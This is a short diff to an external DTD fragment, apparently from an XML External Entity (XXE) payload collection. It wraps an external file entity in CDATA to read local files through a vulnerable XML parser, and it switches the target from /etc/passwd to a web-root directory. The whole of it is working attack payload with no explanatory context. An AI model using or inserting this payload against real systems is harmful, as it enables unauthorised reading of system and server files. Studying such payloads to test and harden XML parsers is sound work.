@@ -1,5 +1,5 @@
 <!ELEMENT data (#PCDATA)>
 <!ENTITY % start "<![CDATA[">
-<!ENTITY % goodies SYSTEM "file:///etc/passwd">
+<!ENTITY % goodies SYSTEM "file:///var/www/htdocs/">
 <!ENTITY % end "]]>">
 <!ENTITY combo '%start;%goodies;%end;'>
